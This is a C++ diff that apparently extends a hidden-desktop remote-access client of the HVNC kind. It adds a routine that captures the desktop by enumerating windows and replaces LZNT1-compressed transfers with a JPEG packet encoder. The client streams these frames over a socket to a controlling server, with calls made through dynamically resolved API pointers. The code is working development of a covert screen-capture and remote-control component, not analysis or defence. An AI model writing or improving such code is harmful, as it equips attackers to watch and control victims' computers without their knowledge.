@@ -6,6 +6,8 @@
 #include <winbase.h>
 #include <string.h>
 #include <gdiplus.h>
+#include <vector>
+#include "../common/ScreenTransfer/ScreenCodec.h"
 #pragma comment (lib,"Gdiplus.Lib")
 using namespace Gdiplus;
 
@@ -439,6 +441,83 @@ cleanup:
     return FALSE;
 }
 
+static BOOL CaptureDesktopFrame(screen2::RawFrame& frame)
+{
+    BOOL captureSuccess = FALSE;
+    HDC hDc = NULL;
+    HDC hDcScreen = NULL;
+    HBITMAP hBmpScreen = NULL;
+    HGDIOBJ hOldBmpScreen = NULL;
+    EnumHwndsPrintData data;
+    RECT rect;
+    HWND hWndDesktop = Funcs::pGetDesktopWindow();
+
+    frame = screen2::RawFrame();
+    Funcs::pGetWindowRect(hWndDesktop, &rect);
+    if (rect.right <= rect.left || rect.bottom <= rect.top)
+        goto cleanup;
+
+    hDc = Funcs::pGetDC(NULL);
+    if (!hDc)
+        goto cleanup;
+
+    hDcScreen = Funcs::pCreateCompatibleDC(hDc);
+    if (!hDcScreen)
+        goto cleanup;
+
+    hBmpScreen = Funcs::pCreateCompatibleBitmap(hDc, rect.right - rect.left, rect.bottom - rect.top);
+    if (!hBmpScreen)
+        goto cleanup;
+
+    hOldBmpScreen = Funcs::pSelectObject(hDcScreen, hBmpScreen);
+    if (!hOldBmpScreen)
+        goto cleanup;
+
+    data.hDc = hDc;
+    data.hDcScreen = hDcScreen;
+    EnumWindowsTopToDown(NULL, EnumHwndsPrint, (LPARAM)&data);
+
+    frame.virtualX = rect.left;
+    frame.virtualY = rect.top;
+    frame.screenWidth = rect.right - rect.left;
+    frame.screenHeight = rect.bottom - rect.top;
+    frame.width = frame.screenWidth;
+    frame.height = frame.screenHeight;
+    frame.stride = screen2::CalcStride24(frame.width);
+    frame.pixels.assign(static_cast<size_t>(frame.stride) * frame.height, 0);
+
+    BITMAPINFO topDownInfo;
+    Funcs::pMemset(&topDownInfo, 0, sizeof(topDownInfo));
+    topDownInfo.bmiHeader.biSize = sizeof(topDownInfo.bmiHeader);
+    topDownInfo.bmiHeader.biPlanes = 1;
+    topDownInfo.bmiHeader.biBitCount = 24;
+    topDownInfo.bmiHeader.biCompression = BI_RGB;
+    topDownInfo.bmiHeader.biWidth = frame.width;
+    topDownInfo.bmiHeader.biHeight = -frame.height;
+    topDownInfo.bmiHeader.biSizeImage = static_cast<DWORD>(frame.pixels.size());
+
+    Funcs::pSelectObject(hDcScreen, hOldBmpScreen);
+    hOldBmpScreen = NULL;
+    if (Funcs::pGetDIBits(hDcScreen, hBmpScreen, 0, frame.height,
+        frame.pixels.data(), &topDownInfo, DIB_RGB_COLORS) == frame.height)
+    {
+        captureSuccess = TRUE;
+    }
+
+cleanup:
+    if (hOldBmpScreen && hDcScreen)
+        Funcs::pSelectObject(hDcScreen, hOldBmpScreen);
+    if (hBmpScreen)
+        Funcs::pDeleteObject(hBmpScreen);
+    if (hDcScreen)
+        Funcs::pDeleteDC(hDcScreen);
+    if (hDc)
+        Funcs::pReleaseDC(NULL, hDc);
+    if (!captureSuccess)
+        frame = screen2::RawFrame();
+    return captureSuccess;
+}
+
 static SOCKET ConnectServer()
 {
     WSADATA     wsa;
@@ -527,11 +606,24 @@ static BOOL RecvInt(SOCKET s, int *i)
     return RecvAll(s, i, (int)sizeof(*i));
 }
 
+static BOOL SendScreenPacket(SOCKET s, const std::vector<BYTE>& packet)
+{
+    if (packet.empty() || packet.size() > (size_t)screen2::MAX_WIRE_PACKET_SIZE)
+        return FALSE;
+    int packetSize = (int)packet.size();
+    return SendInt(s, packetSize) && SendAll(s, packet.data(), packetSize);
+}
+
 static DWORD WINAPI DesktopThread(LPVOID param)
 {
     DWORD sessionId = (DWORD)(ULONG_PTR)param;
     SOCKET s = ConnectServer();
-    BYTE *workSpace = NULL;
+    screen2::ScreenFrameEncoder encoder(screen2::DEFAULT_JPEG_QUALITY);
+    screen2::RawFrame rawFrame;
+    screen2::RawFrame lastSizeFrame;
+    BOOL sizeSent = FALSE;
+    BOOL firstFrameLogged = FALSE;
+    BOOL captureFailureLogged = FALSE;
 
     if (!s)
     {
@@ -554,107 +646,68 @@ static DWORD WINAPI DesktopThread(LPVOID param)
 
     printf("[+] Desktop channel handshake sent (session %lu)\n", sessionId);
 
-    {
-        DWORD workSpaceSize;
-        DWORD fragmentWorkSpaceSize;
-        NTSTATUS status = Funcs::pRtlGetCompressionWorkSpaceSize(COMPRESSION_FORMAT_LZNT1, &workSpaceSize, &fragmentWorkSpaceSize);
-        if (status < 0)
-        {
-            printf("[!] RtlGetCompressionWorkSpaceSize failed: status=0x%08lx\n", status);
-            goto exit;
-        }
-        workSpace = (BYTE *)Alloc(workSpaceSize);
-        if (!workSpace)
-        {
-            printf("[!] Compression workspace allocation failed (%lu bytes)\n", workSpaceSize);
-            goto exit;
-        }
-        printf("[diag] Compression workspace allocated: %lu bytes\n", workSpaceSize);
-    }
-
-    BOOL firstFrameLogged = FALSE;
-    BOOL noFrameLogged = FALSE;
-    BOOL captureFailureLogged = FALSE;
     for (;;)
     {
-        int width, height;
-
-        if (!RecvInt(s, &width))
-            goto exit;
-        if (!RecvInt(s, &height))
-            goto exit;
-
-        BOOL same = GetDeskPixels(width, height);
-        if (same)
+        if (!CaptureDesktopFrame(rawFrame))
         {
-            if (g_lastCaptureFailed && !captureFailureLogged)
+            if (!captureFailureLogged)
             {
                 printf("[!] Desktop capture failed; no frame will be sent until capture succeeds\n");
                 captureFailureLogged = TRUE;
             }
-            else if (!g_lastCaptureFailed && !noFrameLogged)
-            {
-                printf("[diag] No changed desktop pixels yet; hidden desktop may be empty\n");
-                noFrameLogged = TRUE;
-            }
-
-            if (!SendInt(s, 0))
-                goto exit;
+            Funcs::pSleep(100);
             continue;
         }
 
-        DWORD size;
-        NTSTATUS status = Funcs::pRtlCompressBuffer(COMPRESSION_FORMAT_LZNT1,
-            g_pixels,
-            g_bmpInfo.bmiHeader.biSizeImage,
-            g_tempPixels,
-            g_bmpInfo.bmiHeader.biSizeImage,
-            2048,
-            &size,
-            workSpace);
-        if (status < 0)
+        if (!sizeSent ||
+            rawFrame.virtualX != lastSizeFrame.virtualX ||
+            rawFrame.virtualY != lastSizeFrame.virtualY ||
+            rawFrame.screenWidth != lastSizeFrame.screenWidth ||
+            rawFrame.screenHeight != lastSizeFrame.screenHeight)
+        {
+            std::vector<BYTE> sizePacket;
+            if (!screen2::BuildScreenSizePacket(rawFrame, sizePacket) || !SendScreenPacket(s, sizePacket))
+            {
+                goto exit;
+            }
+            lastSizeFrame = rawFrame;
+            sizeSent = TRUE;
+        }
+
+        std::vector<BYTE> framePacket;
+        if (!encoder.BuildFrame(rawFrame, framePacket))
+        {
+            Funcs::pSleep(1000 / screen2::DEFAULT_FPS);
+            continue;
+        }
+
+        if (!SendScreenPacket(s, framePacket))
             goto exit;
 
-        if (!SendInt(s, 1))
+        int response = 0;
+        if (!RecvInt(s, &response))
             goto exit;
-
-        RECT rect;
-        HWND hWndDesktop = Funcs::pGetDesktopWindow();
-        Funcs::pGetWindowRect(hWndDesktop, &rect);
-        if (!SendInt(s, rect.right))
-            goto exit;
-        if (!SendInt(s, rect.bottom))
-            goto exit;
-        if (!SendInt(s, g_bmpInfo.bmiHeader.biWidth))
-            goto exit;
-        if (!SendInt(s, g_bmpInfo.bmiHeader.biHeight))
-            goto exit;
-        if (!SendInt(s, (int)size))
-            goto exit;
-        if (!SendAll(s, g_tempPixels, (int)size))
-            goto exit;
+        if (response != 0)
+            encoder.ForceKeyframe();
+        else
+            encoder.CommitLastBuiltFrame();
 
         if (!firstFrameLogged)
         {
-            printf("[+] First desktop frame sent: remote=%ldx%ld, frame=%ldx%ld, compressed=%lu bytes\n",
-                rect.right,
-                rect.bottom,
-                g_bmpInfo.bmiHeader.biWidth,
-                g_bmpInfo.bmiHeader.biHeight,
-                size);
+            printf("[+] First SCREEN2 desktop frame sent: remote=%dx%d, frame=%dx%d, packet=%zu bytes\n",
+                rawFrame.screenWidth,
+                rawFrame.screenHeight,
+                rawFrame.width,
+                rawFrame.height,
+                framePacket.size());
             firstFrameLogged = TRUE;
         }
 
-        int response;
-        if (!RecvInt(s, &response))
-            goto exit;
-
-        Funcs::pSleep(gc_frameIntervalMs);
+        Funcs::pSleep(1000 / screen2::DEFAULT_FPS);
     }
 
 exit:
     printf("[!] Desktop thread exiting (session %lu)\n", sessionId);
-    Funcs::pFree(workSpace);
     if (s)
         Funcs::pClosesocket(s);
     if (g_hInputThread)
